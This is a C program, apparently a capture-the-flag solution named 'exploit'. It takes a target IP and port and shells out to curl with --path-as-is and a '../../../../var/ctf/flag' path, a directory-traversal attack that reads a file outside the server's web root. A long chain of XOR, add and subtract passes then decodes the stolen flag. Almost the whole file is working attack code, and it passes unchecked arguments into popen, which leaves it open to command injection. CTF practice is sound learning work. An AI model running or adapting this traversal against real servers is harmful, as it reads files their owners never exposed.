#include <stdio.h>
#include <syscall.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFF_SIZE 1024

int dec(unsigned char* output0, int len) {


    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- ) 
        output0[i] = (output0[i] + output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- ) 
        output0[i] = (output0[i] + output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- ) 
        output0[i] = (output0[i] + output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- ) 
        output0[i] = (output0[i] + output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- ) 
        output0[i] = (output0[i] + output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- ) 
        output0[i] = (output0[i] + output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- ) 
        output0[i] = (output0[i] + output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] - output0[i + 1] + 256) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- )
        output0[i] = (output0[i] ^ output0[i + 1]) % 256;

    for(int i = len - 2 ; i >= 0 ; i-- ) 
        output0[i] = (output0[i] + output0[i + 1]) % 256;

    return 0;
}

int main(int argc, char *argv[])
{
    char* ip;
    char* port;
    char cmd[256];
    FILE* fp;
    unsigned char buff[BUFF_SIZE+1];

    if(argc < 3)
    {
        printf("Usage: exploit [IP] [PORT]\n");
        return -1;
    }
    
    ip = argv[1];
    port = argv[2];

    sprintf(cmd, "curl -s --path-as-is %s:%s/../../../../var/ctf/flag", ip, port);

    fp = popen(cmd, "r");
    if(fp == NULL)
    {
        perror("popen fail!\n");
        return -1;
    }
    fgets(buff, BUFF_SIZE, fp);
    int len = strlen(buff);
    
    dec(buff, len);

    printf("%s", buff);

    return 0;
}
